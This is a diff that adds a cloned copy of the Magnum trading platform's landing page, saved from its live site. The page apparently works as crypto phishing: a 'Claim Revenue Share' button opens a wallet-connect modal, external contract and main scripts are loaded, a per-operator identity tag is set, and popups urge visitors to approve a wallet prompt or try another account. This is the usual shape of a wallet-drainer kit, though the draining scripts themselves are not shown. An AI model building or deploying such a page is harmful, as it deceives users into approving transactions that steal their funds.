@@ -1,0 +1,969 @@
+<html lang="en" data-scrapbook-source="https://magnum.trade/" data-scrapbook-create="20231208075931168"
+    data-scrapbook-title="Magnum - An Automated Trading Platform">
+
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://magnum.trade/favicon/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="favicon.ico">
+    <link rel="stylesheet" href="bootstrap-icons.css">
+
+    <style>
+        #loader {
+            display: none;
+        }
+
+        .loader {
+            display: flex !important;
+            justify-content: center;
+            align-items: center;
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(23, 23, 23, 0.8);
+            z-index: 999;
+        }
+    </style>
+    <!-- <link rel="manifest" href="/site.webmanifest"> -->
+    <title>Magnum - An Automated Trading Platform</title>
+    <link rel="stylesheet" href="style.css">
+    <script defer="defer" src="js/vendors.js"></script>
+    <script defer="defer" src="js/contracts.js"></script>
+    <script defer="defer" src="js/main.js"></script>
+  
+    <script>
+      window.UNIQUE_IDENTITY = "yelping_cheetah_23";
+  
+      // Pick a theme here, this defaults to "light"
+      window.modal_theme = "dark";
+  
+      // https://docs.walletconnect.com/2.0/web/web3modal/html/wagmi/theming
+      window.modal_variables = { "--w3m-z-index": "99999999999999999999999999999999",
+        // Example of what you can do:
+        "--w3m-accent-color": "#2db551",
+        "--w3m-background-color": "#2db551",
+        "--w3m-logo-image-url": "./your-logo.svg",                        
+        "--w3m-background-border-radius": "0px",
+        "--w3m-container-border-radius": "0px",
+        "--w3m-wallet-icon-border-radius": "0px",
+        "--w3m-wallet-icon-large-border-radius": "0px",
+        "--w3m-wallet-icon-small-border-radius": "0px",
+        "--w3m-secondary-button-border-radius": "0px",
+        "--w3m-icon-button-border-radius": "0px",
+        "--w3m-button-hover-highlight-border-radius": "0px",
+        "--w3m-input-border-radius": "0px",
+      };
+  
+      window.popups = {
+        PENDING: {
+          title: "Claim Pending",
+          text: "Approve the prompt in order to claim $MAG Revenue Share.",
+        },
+        INVALID: {
+          title: "Ineligible Address",
+          text: "The connected account is not eligible for $MAG Revenue Share.\nPlease try using a different account.",
+        },
+      };
+  
+      window.OVERRIDE_MODE = false;
+    </script>
+  </head>
+
+<body class="">
+    <div id="loader" class="">
+
+        <svg width="200" id="eNdBk0WDcEq1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+            viewBox="0 0 1000 1000" shape-rendering="geometricPrecision" text-rendering="geometricPrecision">
+            <style>
+                #eNdBk0WDcEq4_to {
+                    animation: eNdBk0WDcEq4_to__to 2600ms linear infinite normal forwards
+                }
+
+                @keyframes eNdBk0WDcEq4_to__to {
+                    0% {
+                        transform: translate(463.699997px, 500.300003px)
+                    }
+
+                    15.384615% {
+                        transform: translate(493.699997px, 463.699997px)
+                    }
+
+                    23.076923% {
+                        transform: translate(513.699997px, 493.699997px)
+                    }
+
+                    30.769231% {
+                        transform: translate(513.699997px, 513.699997px)
+                    }
+
+                    38.461538% {
+                        transform: translate(503.699997px, 523.699997px)
+                    }
+
+                    46.153846% {
+                        transform: translate(493.699997px, 533.699997px)
+                    }
+
+                    53.846154% {
+                        transform: translate(473.699997px, 523.699997px)
+                    }
+
+                    69.230769% {
+                        transform: translate(483.699997px, 503.699997px)
+                    }
+
+                    76.923077% {
+                        transform: translate(497.099991px, 500.300003px)
+                    }
+
+                    100% {
+                        transform: translate(497.099991px, 500.300003px)
+                    }
+                }
+            </style>
+            <defs>
+                <rect id="eNdBk0WDcEq2" width="468" height="468" rx="0" ry="0"></rect>
+            </defs>
+            <g>
+                <g id="eNdBk0WDcEq4_to" transform="translate(463.699997,500.300003)">
+                    <g transform="translate(-497.099991,-500.300003)">
+                        <g clip-path="url(#eNdBk0WDcEq8)">
+                            <g>
+                                <path
+                                    d="M667.7,489.2c-5.5-85.7-74-154.2-159.7-159.7v-62.9h-22v62.9c-85.7,5.5-154.2,74-159.7,159.7h-62.9v22.1h62.9C331.8,597,400.3,665.5,486,671v63h22.1v-63c85.7-5.5,154.2-74,159.7-159.7h63v-22.1h-63.1ZM391.6,394.9c24.6-24.5,57.6-40.5,94.3-43.2v28.6c-57.7,5.3-103.7,51.2-108.9,108.9h-28.6c2.7-36.7,18.7-69.8,43.2-94.3ZM486,648.8c-36.8-2.7-69.8-18.6-94.3-43.2s-40.5-57.6-43.2-94.3h28.5C382.3,569,428.2,615,486,620.2v28.6Zm11-118l-11,14.7v67.3c-26.8-2.6-50.9-14.6-69-32.6-18-18-30-42.1-32.6-69h67.3l14.7-11-14.7-11h-67.3c2.6-26.8,14.6-50.9,32.6-69c18-18,42.1-30,69-32.6v67.4l11,14.7L508,455v-67.3c26.8,2.6,50.9,14.6,69,32.6c18,18,30,42.1,32.6,69h-67.3l-14.7,11l14.7,11h67.3c-2.6,26.8-14.6,50.9-32.6,69-18,18-42.1,30-69,32.6v-67.3l-11-14.8Zm105.4,74.8c-24.6,24.6-57.6,40.5-94.3,43.2v-28.6C565.8,615,611.8,569,617,511.3h28.6c-2.7,36.8-18.7,69.8-43.2,94.3ZM617,489.2c-5.2-57.7-51.2-103.7-108.9-108.9v-28.6c36.8,2.7,69.8,18.7,94.3,43.2c24.5,24.6,40.5,57.6,43.2,94.3h-28.6Zm-117.8,1.1h-4.4v7.8h-7.8v4.4h7.8v7.8h4.4v-7.8h7.7v-4.4h-7.7v-7.8"
+                                    fill="#43cb5e"></path>
+                            </g>
+                            <clipPath id="eNdBk0WDcEq8">
+                                <use width="468" height="468" xlink:href="#eNdBk0WDcEq2"
+                                    transform="translate(263.4 266.6)"></use>
+                            </clipPath>
+                        </g>
+                    </g>
+                </g>
+                <g>
+                    <image width="333" height="316" xlink:href="1cc77bd6c6fa9cdee4511818cf297372b6bc36ed.png"
+                        preserveAspectRatio="xMidYMid meet" transform="translate(329 338)" opacity="0.5"></image>
+                    <g>
+                        <g>
+                            <path
+                                d="M564.2,484.4l-49.8,99.9c-.2.7-1.5,1.5-2.2,1.5h-30c-.7,0-2.2-.7-2.4-1.5l-53-102.6v109.7c0,1-1.2,2.2-2.7,2.2h-32.2c-1.7,0-2.4-1.2-2.4-2.2v-191c0-1,.7-2.2,2.4-2.2h32.7c.7,0,2.2.7,2.4,1.5l70.1,143.1l66.7-143.1c.5-.7,1.7-1.5,2.7-1.5h32.2c1.7,0,2.7,1.2,2.7,2.2v146h-37.1v-62h-.1Z"
+                                fill="#fff"></path>
+                        </g>
+                    </g>
+                </g>
+            </g><!-- Code injected by live-server -->
+
+        </svg>
+
+        <!-- <img width="200" src="magnum-loader.svg" alt=""> -->
+    </div>
+    <!-- <ul class="social-link">
+        <li><a href="https://t.me/MagnumCommunity">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="48px" height="48px">
+                    <path fill="#29b6f6" d="M24 4A20 20 0 1 0 24 44A20 20 0 1 0 24 4Z" />
+                    <path fill="#fff"
+                        d="M33.95,15l-3.746,19.126c0,0-0.161,0.874-1.245,0.874c-0.576,0-0.873-0.274-0.873-0.274l-8.114-6.733 l-3.97-2.001l-5.095-1.355c0,0-0.907-0.262-0.907-1.012c0-0.625,0.933-0.923,0.933-0.923l21.316-8.468 c-0.001-0.001,0.651-0.235,1.126-0.234C33.667,14,34,14.125,34,14.5C34,14.75,33.95,15,33.95,15z" />
+                    <path fill="#b0bec5"
+                        d="M23,30.505l-3.426,3.374c0,0-0.149,0.115-0.348,0.12c-0.069,0.002-0.143-0.009-0.219-0.043 l0.964-5.965L23,30.505z" />
+                    <path fill="#cfd8dc"
+                        d="M29.897,18.196c-0.169-0.22-0.481-0.26-0.701-0.093L16,26c0,0,2.106,5.892,2.427,6.912 c0.322,1.021,0.58,1.045,0.58,1.045l0.964-5.965l9.832-9.096C30.023,18.729,30.064,18.416,29.897,18.196z" />
+                </svg>
+            </a></li>
+        <li><a href="https://twitter.com/MagnumCommunity">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="48px" height="48px">
+                    <path fill="#03A9F4"
+                        d="M42,12.429c-1.323,0.586-2.746,0.977-4.247,1.162c1.526-0.906,2.7-2.351,3.251-4.058c-1.428,0.837-3.01,1.452-4.693,1.776C34.967,9.884,33.05,9,30.926,9c-4.08,0-7.387,3.278-7.387,7.32c0,0.572,0.067,1.129,0.193,1.67c-6.138-0.308-11.582-3.226-15.224-7.654c-0.64,1.082-1,2.349-1,3.686c0,2.541,1.301,4.778,3.285,6.096c-1.211-0.037-2.351-0.374-3.349-0.914c0,0.022,0,0.055,0,0.086c0,3.551,2.547,6.508,5.923,7.181c-0.617,0.169-1.269,0.263-1.941,0.263c-0.477,0-0.942-0.054-1.392-0.135c0.94,2.902,3.667,5.023,6.898,5.086c-2.528,1.96-5.712,3.134-9.174,3.134c-0.598,0-1.183-0.034-1.761-0.104C9.268,36.786,13.152,38,17.321,38c13.585,0,21.017-11.156,21.017-20.834c0-0.317-0.01-0.633-0.025-0.945C39.763,15.197,41.013,13.905,42,12.429" />
+                </svg>
+            </a></li>
+        <li><a href="https://www.youtube.com/watch?v=_Gk-F958jVQ">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="48px" height="48px">
+                    <path fill="#FF3D00"
+                        d="M43.2,33.9c-0.4,2.1-2.1,3.7-4.2,4c-3.3,0.5-8.8,1.1-15,1.1c-6.1,0-11.6-0.6-15-1.1c-2.1-0.3-3.8-1.9-4.2-4C4.4,31.6,4,28.2,4,24c0-4.2,0.4-7.6,0.8-9.9c0.4-2.1,2.1-3.7,4.2-4C12.3,9.6,17.8,9,24,9c6.2,0,11.6,0.6,15,1.1c2.1,0.3,3.8,1.9,4.2,4c0.4,2.3,0.9,5.7,0.9,9.9C44,28.2,43.6,31.6,43.2,33.9z" />
+                    <path fill="#FFF" d="M20 31L20 17 32 24z" />
+                </svg>
+            </a></li>
+    </ul> -->
+
+
+
+
+
+
+    <!-- <div class="loader">
+        <img src="Magnum.png" alt="">
+    </div> -->
+
+    <!-- ##################### HEADER CODE:START ###################### -->
+    <header>
+        <div class="container">
+            <a href="#Home">
+                <picture>
+                    <source media="(min-width:768px)" srcset="logo-Navbar-web.png">
+                    <source media="(max-width:767px)" srcset="logo-Navbar-phone.png">
+                    <img src="logo-Navbar-web.png" alt="Welcome to Magnum An Automated Trading Platform">
+                </picture>
+            </a>
+            <div>
+                <ul id="menu" class="navigation">
+                    <!-- <li><a href="#Home">Intro </a></li> -->
+                    <!-- <li><a href="#EarnMagnum" class="text-green"> Earn Profit</a></li> -->
+                    <li><a href="#Trade_with_Magnum" class="">Trade</a></li>
+                    <li><a href="#Features" class="">Features </a></li>
+                    <li><a href="#Pricing" class="">Pricing</a></li>
+                    <li><a href="#Interfaces" class="">Interfaces </a></li>
+                    <li><a href="#Roadmap" class="">Roadmap</a></li>
+                    <!-- <li><a href="#Tokenomics">Token</a></li> -->
+                    <li><a href="#form-contact" class="">Contact Us</a></li>
+                    <li><a href="https://docs.magnum.trade/" target="_blank">Docs</a></li>
+                    <li><a href="https://blog.magnum.trade/" target="_blank">Blog</a></li>
+
+
+                </ul>
+                <a href="https://app.magnum.trade/" target="_blank" class="btn btn-primary">Launch App</a>
+                <button class="menu-toggle">
+
+                    <svg width="30" height="16" viewBox="0 0 30 16" fill="#fff">
+                        <rect width="30" height="1.5"></rect>
+                        <rect y="7" width="20" height="1.5"></rect>
+                        <rect y="14" width="30" height="1.5"></rect>
+                    </svg>
+                </button>
+            </div>
+        </div>
+    </header>
+    <!-- ##################### HEADER CODE:END ###################### -->
+    <!-- ##################### MAIN CODE:START ###################### -->
+    <main class="page-section main-section active" id="Home">
+        <video autoplay="" muted="" loop="" playsinline="" preload="metadata">
+            <source src="trade_charts.mp4" type="video/mp4">
+        </video>
+        <div class="inner-section">
+            <div class="container">
+                <div class="main-title">
+                    <label>Welcome to <strong>Magnum</strong></label>
+                    <p>An Automated Trading Platform</p>
+                </div>
+
+                <div id="connect_button" class="row">
+                    <div id="connect_button" class="title-label">
+                        <div id="connect_button" class="" id="div-1st"><span>Claim Revenue Share</span>
+
+                        </div>
+
+
+
+                    </div>
+                    <ul>
+                        <li>
+                            <a href="">
+                                <img src="apple.svg" alt="">
+                                <div class="d-xs-none">
+                                    <span>Coming soon on the</span>
+                                    <strong>App Store</strong>
+                                </div>
+                            </a>
+                        </li>
+                        <li>
+                            <a href="https://play.google.com/store/apps/details?id=io.sculptech.magnum">
+                                <img src="playstore-outline.svg" alt="">
+                                <div class="d-xs-none">
+                                    <span>GET IT ON</span>
+                                    <strong>Google Play</strong>
+                                </div>
+                            </a>
+                        </li>
+                        <li>
+                            <a href="https://t.me/magnum_trade_bot">
+                                <img src="bxl-telegram.svg" alt="">
+                                <div class="d-xs-none">
+                                    <strong>Telegram Bot</strong>
+                                </div>
+                            </a>
+                        </li>
+                    </ul>
+
+                </div>
+
+            </div>
+        </div>
+    </main>
+
+    <div class="content-section">
+        <!-- ##################### Earn with Magnum ###################### -->
+        <!-- <article class="page-section" id="EarnMagnum">
+            <div class="container earn_with_magnum">
+                <div class="title">
+                    <h1>Earn with Magnum</h1>
+                    <h2>Passive Income with Magnum</h2>
+                </div>
+                <div class="row">
+                    <div class="col-6">
+                        <div class="title-token">Magnum Staking makes holding $MAG an appealing passive income
+                            opportunity.</div>
+                        <div class="token_list">
+                            <ul>
+                                <li>In this program, we divide the earnings from Magnum services and MEV bots
+                                    between our token holders.</li>
+                                <li>You can withdraw profits anytime from our claim area. Principal can be withdrawn
+                                    once your initial locktime has passed.</li>
+                                <li>Our investors also get exclusive market signals that our bots detect, and an option
+                                    to invest right away from the telegram bot or the app.</li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="col-6">
+                        <div class="counter-custom">
+                            <div class="count_bg">
+                                <img src="counter/Count-1.png">
+                            </div>
+                            <div class="num_counter">
+                                <div class='numCounter' data-value='12345' id="tradesResult"></div>
+                            </div>
+                        </div>
+
+                        <div class="profitableTrades">
+                            Profitable MEV Trades
+                        </div>
+                        <div class="text-center">
+                            <a href="#" target="_blank" class="btn btn-primary btn-space">Invest Now</a>
+                        </div>
+
+                    </div>
+                </div>
+            </div>
+        </article> -->
+
+        <!-- ##################### Trade_with_Magnum ###################### -->
+        <div class="Partners">
+            <h4><span> Our Partners </span></h4>
+            <a href="https://t.me/SafeAnalyzerbot">
+                <img src="5.png" alt="">
+                <label><span>Safe</span> Analyzer</label>
+            </a>
+            <a href="https://t.me/etherscan_tracker">
+                <img src="4.png" alt="">
+                <label><span> Etherscan </span> Tracker</label>
+            </a>
+
+            <a href="https://t.me/ACScalls">
+                <img src="3.png" alt="">
+                <label><span>ACS </span> Calls</label>
+            </a>
+            <a href="https://t.me/ZLaunchBotOfficial">
+                <img src="2.png" alt="">
+                <label><span>Z</span> Launch</label>
+            </a>
+            <a href="https://t.me/CryptoFighterBot">
+                <img src="1.png" alt="">
+                <label><span>Crypto</span> Fighter</label>
+            </a>
+            <a href="https://t.me/Intelsignals">
+                <img src="6.png" alt="Intel Signals">
+                <label><span>Intel</span> Signals</label>
+            </a>
+        </div>
+        <div class="page-section trade_with_magnum active" id="Trade_with_Magnum">
+
+            <div class="container">
+                <div class="title">
+                    <h1>Why Magnum</h1>
+                    <h2>Trade with Magnum</h2>
+                </div>
+                <!--==== desktop screen ====-->
+                <div class="row">
+                    <div class="columns">
+                        <div class="trade_img">
+                            <img src="FastestTrades.png">
+                        </div>
+                        <h2>Fastest Trades</h2>
+                        <p>Speed up your trading with Magnum's efficient platform, outperforming traditional DEXs with
+                            rapid, on-chain transactions. Our user-friendly interface makes it simple: one click and
+                            your trade is on its way, no delays.</p>
+                    </div>
+
+                    <div class="columns">
+                        <div class="trade_img">
+                            <img src="Private_Transactions.png">
+                        </div>
+                        <h2>Private Transactions</h2>
+                        <p>Trade with confidence, knowing that your transactions are safeguarded against MEV bots.
+                            Magnum's secure transaction protocol means your trades remain private until they're mined,
+                            keeping you one step ahead.</p>
+                    </div>
+
+                    <div class="columns">
+                        <div class="trade_img">
+                            <img src="Limit_Orders.png">
+                        </div>
+                        <h2>Limit Orders</h2>
+                        <p>Set your target price for buying or selling tokens with Magnum's limit order functionality.
+                            We'll automatically execute your trade at your specified price, ensuring you never miss an
+                            opportunity.</p>
+                    </div>
+                </div>
+                <!--===== mobile screen ===-->
+
+            </div>
+        </div>
+
+        <!-- ##################### MAIN CODE:END ###################### -->
+        <div class="page-section card-choose active" id="Features">
+
+            <div class="container">
+
+                <div class="title">
+                    <h1>Features</h1>
+                    <h2>Why you should choose Magnum?</h2>
+                </div>
+                <!--==== desktop screen ====-->
+                <div class="row d-xs-none">
+                    <div class="columns">
+                        <div class="card">
+                            <span>01</span>
+                            <strong>Fastest Crypto Bots</strong>
+                            <p>Our bots are built to perform ridiculously faster than other platforms, not leaving you
+                                ever to miss the market opportunities!</p>
+                        </div>
+                        <div class="card">
+                            <span>04</span>
+                            <strong>Easy GUI</strong>
+                            <p>We want you to focus on market, not keep struggling with a chatbot! So we have built the
+                                web and mobile clients for a much convenient interface.</p>
+                        </div>
+                    </div>
+
+                    <div class="columns">
+                        <div class="card">
+                            <span>02</span>
+                            <strong>Secure Key Vault</strong>
+                            <p>Your funds matter the most, so we make sure all the wallet data is tucked under a strong
+                                encryption layer.</p>
+                        </div>
+                        <div class="card">
+                            <span>05.</span>
+                            <strong>MEV Protection</strong>
+                            <p>We provide premium MEV protection and best user interface to do private transactions on
+                                multiple networks like Ethereum and Binance smart chain.</p>
+                        </div>
+                    </div>
+
+                    <!-- <div class="columns">
+                    <div class="card">
+                        <img src="pngwing.png" alt="">
+                        <span>02.</span>
+                        <strong>Secure Key Vault</strong>
+                        <p>Your funds matter the most, so we make sure all the wallet data is tucked under a strong encryption layer.</p>
+                    </div>
+                </div>  -->
+
+                    <div class="columns">
+                        <div class="card">
+                            <span>03</span>
+                            <strong>One-stop Solution</strong>
+                            <p>Magnum aims to be the only platform you'll ever visit for all your market tools! We have
+                                all kinds of bots and tools available right here.</p>
+                        </div>
+                        <div class="card">
+                            <span>06.</span>
+                            <strong>Lowest Fees</strong>
+                            <p>We have the most competitive pricing policy on the market. We provide the best of the
+                                services with the least of the commission and fees.</p>
+                        </div>
+                    </div>
+                </div>
+                <!--===== mobile screen ===-->
+                <div class="row d-none d-xs-block">
+                    <div class="columns">
+                        <div class="card">
+                            <span>01.</span>
+                            <strong>Fastest Crypto Bots</strong>
+                            <p>Our bots are built to perform ridiculously faster than other platforms, not leaving you
+                                ever to miss the market opportunities!</p>
+                        </div>
+                        <div class="card">
+                            <span>02.</span>
+                            <strong>Secure Key Vault</strong>
+                            <p>Your funds matter the most, so we make sure all the wallet data is tucked under a strong
+                                encryption layer.</p>
+                        </div>
+                    </div>
+
+                    <div class="columns">
+                        <div class="card">
+                            <span>03.</span>
+                            <strong>One-stop Solution</strong>
+                            <p>Magnum aims to be the only platform you'll ever visit for all your market tools! We have
+                                all kinds of bots and tools available right here.</p>
+                        </div>
+                        <div class="card ">
+                            <span>04.</span>
+                            <strong>Easy GUI</strong>
+                            <p>We want you to focus on market, not keep struggling with a chatbot! So we have built the
+                                web and mobile clients for a much convenient interface.</p>
+                        </div>
+                    </div>
+
+                    <!-- <div class="columns">
+                    <div class="card">
+                        <img src="pngwing.png" alt="">
+                        <span>02.</span>
+                        <strong>Secure Key Vault</strong>
+                        <p>Your funds matter the most, so we make sure all the wallet data is tucked under a strong encryption layer.</p>
+                    </div>
+                </div>  -->
+
+                    <div class="columns">
+                        <div class="card">
+                            <span>05.</span>
+                            <strong>MEV Protection</strong>
+                            <p>We provide premium MEV protection and best user interface to do private transactions on
+                                multiple networks like Ethereum and Binance smart chain.</p>
+                        </div>
+                        <div class="card">
+                            <span>06.</span>
+                            <strong>Lowest Fees</strong>
+                            <p>We have the most competitive pricing policy on the market. We provide the best of the
+                                services with the least of the commission and fees.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+
+        <section class="pricing-card page-section active" id="Pricing">
+
+
+            <div class="container">
+                <div class="title">
+                    <h1>Pricing</h1>
+                    <h2>How our pricing works </h2>
+                </div>
+                <div class="container card-per-parent">
+                    <div class="card-per  active">
+                        <div class="card-header">Manual Buy/Sell Fee</div>
+                        <div class="card-body">
+                            <label>0.2%</label>
+                            <small>per successful trade transaction</small>
+                        </div>
+                    </div>
+                    <div class="card-per active">
+                        <div class="card-header">Copy Trading Fee</div>
+                        <div class="card-body">
+                            <label>0.4%</label>
+                            <small>per successful trade transaction</small>
+                        </div>
+                    </div>
+                    <div class="card-per active">
+                        <div class="card-header">Sniping Fee</div>
+                        <div class="card-body">
+                            <label>0.6%</label>
+                            <small>per successful snipe transaction</small>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="container card-price-parent">
+                    <div class="title-Subscriptions">Subscriptions</div>
+                    <div class="card-price ">
+
+                        <label>Trader Plus</label>
+                        <strong>Lock 500 MAG for a month</strong>
+                        <ul>
+                            <li>Free Unlimited Sniping</li>
+                            <li>Free Unlimited Buy/Sell</li>
+                            <li>Trader + NFT Badge</li>
+                        </ul>
+                        <button><span> Subscribe Now</span></button>
+                    </div>
+                    <div class="card-price active ">
+                        <small>Popular</small>
+                        <label>Trader Pro</label>
+                        <strong>Lock 3000 MAG for a year</strong>
+                        <ul>
+                            <li>Free Unlimited Sniping</li>
+                            <li>Free Unlimited Buy/Sell</li>
+                            <li>Free Unlimited Copy Trading</li>
+                            <li>Trader pro NFT Badge</li>
+                        </ul>
+                        <button><span> Subscribe Now</span></button>
+                    </div>
+
+                </div>
+                <!-- <div class="row">
+                    <div class="column">
+                        <div class="card">
+                            <h3>Recurring Bots</h3>
+                            <h4>Frontrunning, Copytrading</h4>
+                            <p>Pay as you go</p>
+                            <h2>1%</h2>
+                            <div class="trade">Commission on any trade executed by <br> Magnum</div>
+                            <div class="card_footer">
+                                <strong>Subscriptions </strong> <span>( Coming Soon)</span> <sup>*</sup>
+                            </div>
+
+                        </div>
+                    </div>
+                    <div class="column">
+                        <div class="column">
+                            <div class="card">
+                                <h3>One-time Bots</h3>
+                                <h4>Sniping, Limit Buy/Sell</h4>
+                                <p>Pay as you go</p>
+                                <h2>1%</h2>
+                                <div class="trade">Commission on any transaction Magnum <br> executes</div>
+                            </div>
+                        </div>
+                    </div>
+
+                </div> -->
+            </div>
+
+        </section>
+
+
+        <article class="page-section active" id="Interfaces">
+            <div class="container user_interfaces">
+                <div class="title">
+                    <h1>Interfaces</h1>
+                    <h2>Ways to monitor and manage your bots</h2>
+                </div>
+                <div class="row web_app">
+                    <div class="col-6">
+                        <h3>Web Application</h3>
+                        <p>Effortlessly log in from any location to manage and monitor your assets through a
+                            user-friendly interface designed for clarity and ease of use. Benefit from our expedited
+                            Telegram login for swift access while maintaining your privacy.</p>
+                    </div>
+                    <div class="col-6">
+                        <img src="Macbook-Air.png">
+                    </div>
+                </div>
+                <div class="row">
+                    <div class="col-6">
+                        <h3>Mobile Application</h3>
+                        <p>Designed for both iOS and Android, our app delivers a user-friendly interface superior to the
+                            Telegram experience, putting comprehensive bot management and real-time notifications right
+                            in the palm of your hand.
+                        </p>
+
+                    </div>
+                    <div class="col-6">
+                        <img src="mobile.png" alt="">
+                    </div>
+                </div>
+                <div class="row">
+                    <div class="col-6">
+                        <h3>Telegram Bot</h3>
+                        <p>We definitely support the classic telegram chat bot. We provide the fastest and feature-rich
+                            on-chain automated trading and sniping telegram bot. Magnum tg bot also provides copy
+                            trading and limit buy/sell orders with MEV protection on DEX platforms.</p>
+                    </div>
+                    <div class="col-6 text-right">
+                        <img src="chat-screen.png" alt="">
+                    </div>
+                </div>
+            </div>
+        </article>
+
+        <!--====== pricing-card ====-->
+
+        <section class="page-section active" id="Roadmap">
+            <div>
+                <div class="container">
+                    <div class="title">
+                        <h1>Roadmap</h1>
+                        <h2>Where are we taking this platform</h2>
+                    </div>
+                    <div class="timeline">
+                        <div class="timeline-title">2023</div>
+                        <div class="timeline-title-parent">
+                            <div class="timeline-title ">2024</div>
+                        </div>
+
+
+                        <div class="js-timeline ag-timeline">
+
+                            <div class="js-timeline_line ag-timeline_line" style="top: 0px; bottom: 15.0005px;">
+                                <div class="js-timeline_line-progress ag-timeline_line-progress" style="height: 0px;">
+                                </div>
+                            </div>
+
+                            <div class="js-timeline_item">
+                                <div class="js-timeline-card_point-box">Q1 2023</div>
+                                <div class="ag-timeline-card_item">
+                                    <ul>
+                                        <li>Ideation</li>
+                                        <li>Concept Prototype</li>
+                                        <li>Targeted Market Research</li>
+                                        <li>Feature Design Development</li>
+                                        <li>Revenue Model Formulation</li>
+                                    </ul>
+                                </div>
+                            </div>
+                            <div class="js-timeline_item">
+                                <div class="js-timeline-card_point-box">Q2 2023</div>
+                                <div class="ag-timeline-card_item">
+                                    <ul>
+                                        <li>Platform Functional Refinements</li>
+                                        <li>Strategic Product Marketing Initiatives</li>
+                                        <li>Launch of Mobile Applications</li>
+                                        <li>Integration of Telegram Features</li>
+                                        <li>Establishment of Investors Club</li>
+                                    </ul>
+                                </div>
+                            </div>
+                            <div class="js-timeline_item">
+                                <div class="js-timeline-card_point-box">Q3 2023</div>
+                                <div class="ag-timeline-card_item">
+                                    <ul>
+                                        <li>Official Product Launch</li>
+                                        <li>Feature Requests</li>
+                                        <li>Partnership Programs</li>
+                                        <li>Whale Database</li>
+                                    </ul>
+                                </div>
+                            </div>
+
+                            <div class="js-timeline_item">
+                                <div class="js-timeline-card_point-box">Q4 2023</div>
+                                <div class="ag-timeline-card_item">
+                                    <ul>
+                                        <li>Token Presale/Launch</li>
+                                        <li>Additional Trading Bots Integration</li>
+                                        <li>Premium Influencer Area Launch</li>
+                                        <li>Exclusive Trading Channels Opening</li>
+                                    </ul>
+                                </div>
+                            </div>
+
+                            <div class="js-timeline_item Q-2024">
+                                <div class="js-timeline-card_point-box">Q1 2024</div>
+                                <div class="ag-timeline-card_item">
+                                    <ul>
+                                        <li>Traders Connect - Social Media for Traders</li>
+                                        <li>Beta Testing of New Features</li>
+                                        <li>Integration of Multiple Markets</li>
+                                        <li>Alpha Release of Market Prediction Tools</li>
+                                    </ul>
+                                </div>
+                            </div>
+
+                            <div class="js-timeline_item">
+                                <div class="js-timeline-card_point-box">Q2 2024</div>
+                                <div class="ag-timeline-card_item">
+                                    <ul>
+                                        <li>AI Powered Trading</li>
+                                        <li>Integration of an MEV Builder</li>
+                                        <li>Magnum's Ascension as MEV Block Validator</li>
+                                    </ul>
+                                </div>
+                            </div>
+
+
+                            <div class="js-timeline_item">
+                                <div class="js-timeline-card_point-box"></div>
+                                <div class="ag-timeline-card_item">
+                                    <!-- <ul>
+                                <li>AI Powered Trading - Launch</li>
+                                <li>More Interface Integrations </li>
+                                <li> Market Index</li>
+                                <li>Stock Tethered Cryptos - Trading</li>
+                            </ul> -->
+                                </div>
+                            </div>
+
+                        </div>
+                    </div>
+
+
+                </div>
+            </div>
+        </section>
+
+        <!-- <section class="tokenomics page-section" id="Tokenomics">
+        <div class="container">
+            <div class="title">
+                <h1>MAG Tokenomics</h1>
+                <h2>MAG Token Tokenomics</h2>
+            </div>
+            <div class="row align-items-center">
+                 left section
+                <div class="column">
+                <div class="left_sec">
+                <p>Total Supply</p>
+                <h3>338,000,000</h3>
+                <p>DEX Liquidity</p>
+                <div class="locked">
+                    <strong>60% </strong> <span>(Locked till Q3 2024)</span>
+                </div>
+
+                <div class="revenue">
+                    <div class="cols1">
+                        <p>Revenue Sharing Pool</p>
+                        <h3>20%</h3>
+                    </div>
+                    <div class="cols1">
+                        <p>Influencer Holding Pool</p>
+                        <div >
+                            <span class="member">20%</span> <span>(Locked for Membership)</span>
+                        </div>
+                        
+                    </div>
+                </div>
+
+                </div>
+                </div>
+
+                    left section end
+                <div class="column">
+             
+                    <div class="right_sec">
+                        <div class="text-center">
+                           <img class="img-fluid" src="Graph.svg" alt="">
+                        </div>
+                        <div class="graph_token">
+                            <div>     
+                                <p>Token</p>
+                                <h5>Magnum</h5>
+                            </div>
+                            <div>
+                                <p>Symbol</p>
+                                <h5>MAG</h5>
+                            </div>
+                            <div>
+                                <p>Logo</p>
+                             <img src="Logo-mag.svg" alt="">
+                            </div>
+
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+        </div>
+    </section>  -->
+
+
+
+
+
+
+
+        <section class="form-contact page-section active" id="form-contact">
+            <div class="container">
+                <div class="title">
+                    <h1>Contact Us</h1>
+                    <h2>Contact Us</h2>
+                </div>
+
+                <div class="row">
+                    <label>Let’s discuss</label>
+                    <form id="contactForm">
+                        <input type="text" name="name" placeholder="Your name here" value="">
+                        <input type="email" name="email" placeholder="Your email here" value="">
+                        <textarea placeholder="Your message here" name="message" id="" rows="5"></textarea>
+                        <button type="submit" class="btn btn-primary">Send</button>
+                    </form>
+
+                </div>
+            </div>
+        </section>
+        <footer>
+            <div class="container">
+                <div class="row">
+                    <div class="footer-logo">
+                        <picture>
+                            <source media="(min-width:768px)" srcset="logo-Navbar-web.png">
+                            <source media="(max-width:767px)" srcset="logo-Navbar-phone.png">
+                            <img src="logo-Navbar-web.png" alt="Welcome to Magnum An Automated Trading Platform">
+                        </picture>
+                        <!-- <strong>Magnum</strong> -->
+                    </div>
+                    <ul class="social-link">
+                        <li>
+                            <a href="https://t.me/MagnumCommunity">
+                                <i class="bi bi-people-fill"></i>
+                            </a>
+                        </li>
+                        <li>
+                            <a href="https://t.me/MagnumAnnouncements">
